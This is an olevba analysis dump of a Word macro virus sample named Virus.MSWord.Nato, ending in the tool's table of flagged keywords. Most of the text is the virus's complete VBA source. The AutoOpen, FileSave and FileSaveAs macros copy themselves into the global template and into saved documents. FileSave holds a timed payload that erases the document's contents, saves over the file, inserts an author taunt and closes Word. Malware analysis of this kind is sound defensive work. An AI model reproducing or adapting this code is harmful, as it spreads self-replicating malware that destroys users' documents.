olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nato
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "????????? ????????? ???????"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "??????, ????????, ???????? ??? ????????? ???????"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ListMacros.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/ListMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "??????????? ?????? ????????? ????????"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ListMacros.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "?????????? ????????? ??? ?????? ??????, ? ?????? ??????? ??? ? ?????? ???????"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim InfectIt
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
InfectIt = 0
If (dlg.Format = 0) Or (dlg.Format = 1) Then
InfectIt = 1
End If
WordBasic.FileSaveAs dlg
If InfectIt = 1 Then
WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
WordBasic.MacroCopy "FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
WordBasic.MacroCopy "FileTemplates", WordBasic.[WindowName$]() + ":FileTemplates", 1
WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
WordBasic.MacroCopy "ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
WordBasic.MacroCopy "ListMacros", WordBasic.[WindowName$]() + ":ListMacros", 1
WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSaveAll 1, 1
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "?????????? ????????? ????????? ??? ???????"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
WordBasic.DisableAutoMacros 0
On Error GoTo -1: On Error GoTo Abort
If (WordBasic.WeekDay(WordBasic.Now()) = 2) And (WordBasic.Hour(WordBasic.Now()) = 13) Then
WordBasic.EditSelectAll
WordBasic.EditCut
WordBasic.FileSaveAll 1, 1
WordBasic.EditSelectAll
WordBasic.EditCut
WordBasic.Insert "The Macro.Word.NATO was created by MaD PaNiC..."
WordBasic.FileExit 2
End If
WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
WordBasic.MacroCopy "FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
WordBasic.MacroCopy "FileTemplates", WordBasic.[WindowName$]() + ":FileTemplates", 1
WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
WordBasic.MacroCopy "ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
WordBasic.MacroCopy "ListMacros", WordBasic.[WindowName$]() + ":ListMacros", 1
WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSaveAll 1, 1
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nato - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "NATO"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
WordBasic.DisableAutoMacros 0
On Error GoTo -1: On Error GoTo Abort
WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
WordBasic.MacroCopy "FileSave", WordBasic.[FileName$]() + ":FileSave", 1
WordBasic.MacroCopy "FileTemplates", WordBasic.[FileName$]() + ":FileTemplates", 1
WordBasic.MacroCopy "FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", 1
WordBasic.MacroCopy "ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 1
WordBasic.MacroCopy "ListMacros", WordBasic.[FileName$]() + ":ListMacros", 1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1
WordBasic.FileSaveAll 1, 1
Abort:
On Error GoTo -1: On Error GoTo Quit
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "AutoOpen", 1
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSave", "FileSave", 1
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileTemplates", "FileTemplates", 1
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "FileSaveAs", 1
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "ToolsMacro", 1
WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ListMacros", "ListMacros", 1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSaveAll 1, 1
Quit:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

